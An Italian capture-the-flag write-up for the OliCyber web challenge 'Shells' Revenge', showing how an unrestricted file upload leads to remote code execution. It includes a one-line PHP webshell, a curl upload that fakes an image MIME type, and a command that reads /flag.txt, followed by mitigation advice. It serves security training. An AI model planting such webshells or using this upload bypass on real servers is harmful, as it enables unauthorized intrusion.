# Shells' Revenge

**Competizione:** OliCyber <br>
**Categoria:** Web <br>
**URL:** http://shellrevenge.challs.olicyber.it

---

## Descrizione
>È arrivato il momento di dire basta ai soprusi di Super Mario! Fratelli koopa, riprendiamoci la libertà. Potere ai gusci!
La flag si trova in /flag.txt
Sito: http://shellrevenge.challs.olicyber.it

L'obiettivo è leggere il file `/flag.txt` sul server remoto.

---

## Soluzione

### 1. Ricognizione iniziale

Analisi della pagina principale con curl:

```bash
curl -v http://shellrevenge.challs.olicyber.it
```

Output rilevante dagli header:
```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
```

Nel body HTML è presente un form di upload file:

```html
<form action="index.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file">
    <button type="submit" name="submit" value="Invia">Invia</button>
</form>
```

### 2. Vulnerabilità individuata — Unrestricted File Upload (RCE)

Il server è PHP/7.4 su Apache e non applica alcuna validazione sull'estensione o sul contenuto del file caricato. È possibile uploadare direttamente una webshell `.php` che verrà eseguita dal server.

### 3. Exploit

**Creazione della webshell:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Upload della webshell** (simulando un file immagine con `type=image/gif`):

```bash
curl -s -X POST "http://shellrevenge.challs.olicyber.it/index.php" \
  -F "file=@shell.php;type=image/gif" \
  -F "submit=Invia"
```

**Risposta del server:**

```html
<p class='valid'>Upload completato!
  <a href='/uploads/cd660ac6289a0cc54e91e9def5875194/shell.php'>Vai</a>
</p>
```

Il file viene salvato in una directory con hash MD5 casuale sotto `/uploads/`.

**Esecuzione RCE — lettura della flag:**

```bash
curl "http://shellrevenge.challs.olicyber.it/uploads/cd660ac6289a0cc54e91e9def5875194/shell.php?cmd=cat+/flag.txt"
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

La vulnerabilità è una classica **Unrestricted File Upload** (OWASP A05): il server accetta qualsiasi file senza validare estensione, MIME type reale o contenuto. Caricando una webshell PHP è possibile ottenere RCE immediata.

**Mitigazioni consigliate:**
- Whitelist delle estensioni permesse (solo immagini reali)
- Validazione del MIME type lato server (non fidarsi del Content-Type del client)
- Salvare i file upload fuori dalla document root o con nome randomizzato senza estensione eseguibile
- Configurare Apache per non eseguire PHP nelle directory di upload